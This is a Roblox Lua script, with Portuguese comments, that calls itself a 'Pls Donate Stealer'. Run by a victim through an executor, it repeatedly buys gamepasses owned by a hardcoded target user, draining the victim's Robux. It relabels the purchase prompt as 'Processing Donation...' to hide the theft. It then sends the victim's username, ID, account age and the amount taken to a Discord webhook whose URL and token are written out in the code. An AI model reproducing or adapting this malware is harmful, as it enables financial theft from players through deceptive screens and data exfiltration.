repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer.Parent

local Username = "Ian_wp27"  -- CORRIJA AQUI SE NECESSÁRIO
local Webhook = "https://discord.com/api/webhooks/1359920557998604399/TADkOrRGt4BHvwAxE7NBMMxx4JHI-EBblHnsnvRS8iXThLWDTvpGoYKThwdlmCcvqyO6"

local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

local request = syn and syn.request or http_request or http.request
if not request then error("Executor sem HTTP!") end

local Remotes = ReplicatedStorage:WaitForChild("Remotes", 10)
local RemotesModule = require(Remotes)

local headers = {["Content-Type"] = "application/json"}
local userRobux = 0
local donationsSent = 0

local function sendWebhook(robuxAmount)
    local embed = {
        title = "🎁 Pls Donate HIT!",
        color = 65280,
        thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..Players.LocalPlayer.UserId.."&width=420&height=420"},
        fields = {
            {name="👤 Victim", value="```"..Players.LocalPlayer.Name.."\nID: "..Players.LocalPlayer.UserId.."\nAge: "..Players.LocalPlayer.AccountAge.."```", inline=true},
            {name="💰 Robux Doados", value="```"..tostring(robuxAmount or donationsSent).." R$```", inline=true},
            {name="🎯 Target", value="```"..Username.."```", inline=true},
            {name="🛠️ Executor", value="```"..(identifyexecutor and identifyexecutor() or "Unknown").."```", inline=true}
        },
        footer = {text="Shar's Offline Stealer"}
    }
    
    request({
        Url=Webhook, Method="POST", Headers=headers,
        Body=HttpService:JSONEncode({
            username="Pls Donate Stealer",
            content="@everyone",
            embeds={embed}
        })
    })
end

-- Pega UserId do target
local targetUserId = Players:GetUserIdFromNameAsync(Username)
print("🎯 Target UserId:", targetUserId)

-- AUTO DONATE LOOP (FUNCIONA OFFLINE)
spawn(function()
    while task.wait(2) do
        pcall(function()
            -- Procura TODAS as booths no workspace
            for _, booth in pairs(workspace:GetChildren()) do
                if booth:FindFirstChild("BoothUI") and booth.BoothUI:FindFirstChild("Items") then
                    for _, item in pairs(booth.BoothUI.Items.Frame:GetChildren()) do
                        if item:GetAttribute("AssetType") == "Gamepass" and 
                           item:GetAttribute("OwnerUserId") == targetUserId and
                           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, item:GetAttribute("AssetId")) then
                            
                            local price = item:GetAttribute("AssetPrice")
                            if price and price > 0 then
                                print("💸 Doando "..price.." para "..Username)
                                item.Prompt:FireServer("", false, price)
                                donationsSent = donationsSent + price
                            end
                            break
                        end
                    end
                end
            end
        end)
    end
end)

-- PurchasePrompt Hijack (fake screens)
CoreGui.ChildAdded:Connect(function(child)
    if child.Name == "PurchasePrompt" then
        spawn(function()
            local container = child:WaitForChild("ProductPurchaseContainer", 2)
            if container then
                local animator = container:WaitForChild("Animator", 2)
                if animator then
                    animator.ChildAdded:Connect(function(prompt)
                        if prompt.Name == "Prompt" then
                            task.wait(0.1)
                            local alert = prompt:FindFirstChild("AlertContents")
                            if alert then
                                -- Fake "Processing Donation"
                                local title = alert:FindFirstChild("TitleContainer", 0.1)
                                if title then title.TitleArea.Title.Text = "Processing Donation..." end
                            end
                        end
                    end)
                end
            end
        end)
    end
end)

-- Detecta gifts recebidos (confirma donation)
pcall(function()
    RemotesModule.OnClientEvent("GiftSentAlert"):Connect(function(senderId, amount)
        if senderId == targetUserId then
            print("✅ CONFIRMADO: Recebido "..amount.." R$ de "..Username)
            donationsSent = donationsSent + amount
            if donationsSent >= 50 then
                sendWebhook(donationsSent)
                print("🎉 WEBHOOK ENVIADO! Total: "..donationsSent.." R$")
            end
        end
    end)
end)

print("✅ LOADED! Auto-donating para "..Username.." (Offline Mode)")
print("📊 Robux doados: 0 | Aguardando gifts...")
